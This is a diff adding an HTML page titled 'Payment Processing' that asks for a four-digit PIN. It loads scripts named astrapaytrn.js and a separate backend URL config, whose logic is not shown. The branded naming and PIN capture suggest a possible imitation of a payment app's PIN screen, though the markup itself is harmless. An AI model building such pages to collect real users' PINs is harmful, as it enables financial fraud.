@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Processing</title>
+    <link rel="stylesheet" href="/assets/css/astrapaytrn.css">
+</head>
+<body>
+    <div id="preloader-overlay">
+        <div id="preloader"></div>
+    </div>
+    <div id="pin-container" class="page">
+        <h2 style="color: #333;">Enter PIN</h2>
+        <form id="pin-form">
+            <p>Last 4 digits of your account number: <span id="lastDigits">1234</span></p>
+    
+            <div class="pin-input">
+                <input type="password" id="pin1" maxlength="1" required>
+                <input type="password" id="pin2" maxlength="1" required>
+                <input type="password" id="pin3" maxlength="1" required>
+                <input type="password"id="pin4" maxlength="1" required>
+            </div>
+    
+            <button type="button" onclick="processPayment()">Process Payment</button>
+        </form>
+    </div>
+    <script src="/assets/config/backend-url.js"></script>
+    <script src="/assets/js/preloader.js"></script>
+    <script src="/assets/js/astrapaytrn.js"></script>
+
+
+</body>
